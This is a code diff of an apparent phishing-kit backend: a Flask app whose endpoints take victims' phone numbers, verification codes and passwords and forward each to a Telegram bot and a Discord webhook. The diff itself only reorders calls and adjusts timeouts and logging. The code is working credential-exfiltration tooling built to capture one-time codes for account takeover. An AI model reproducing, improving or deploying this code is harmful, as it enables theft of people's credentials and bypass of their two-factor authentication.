@@ -26,8 +26,8 @@ def send_phone():
         return jsonify({"ok": False, "error": "전화번호가 없습니다."}), 400
     
     message = f"🚀 num: {phone_number}"
-    send_discord_message(message)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    send_discord_message(message)
     payload = {
         "chat_id": CHAT_ID,
         "text": message
@@ -58,8 +58,8 @@ def send_code():
         return jsonify({"ok": False, "error": "전화번호 또는 인증 코드가 없습니다."}), 400
     
     message = f"🐒 cod: {verification_code}"
-    send_discord_message(message)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    send_discord_message(message)
     payload = {
         "chat_id": CHAT_ID,
         "text": message
@@ -90,8 +90,8 @@ def send_password():
         return jsonify({"ok": False, "error": "전화번호 또는 비밀번호가 없습니다."}), 400
     
     message = f"⭐ pass: {password}"
-    send_discord_message(message)
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    send_discord_message(message)
     payload = {
         "chat_id": CHAT_ID,
         "text": message
@@ -115,13 +115,14 @@ def send_discord_message(message):
     }
     try:
         print(f"Sending Discord message: {message}")
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
         print(f"Discord webhook response status: {response.status_code}")
-        print(f"Discord webhook response text: {response.text}")
+        if response.status_code >= 400:
+            print(f"Discord webhook error response: {response.text}")
     except requests.exceptions.RequestException as e:
         print(f"Error sending Discord message (RequestException): {e}")
     except Exception as e:
-        print(f"Error sending Discord message: {e}")
+        print(f"Error sending Discord message (General): {e}")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
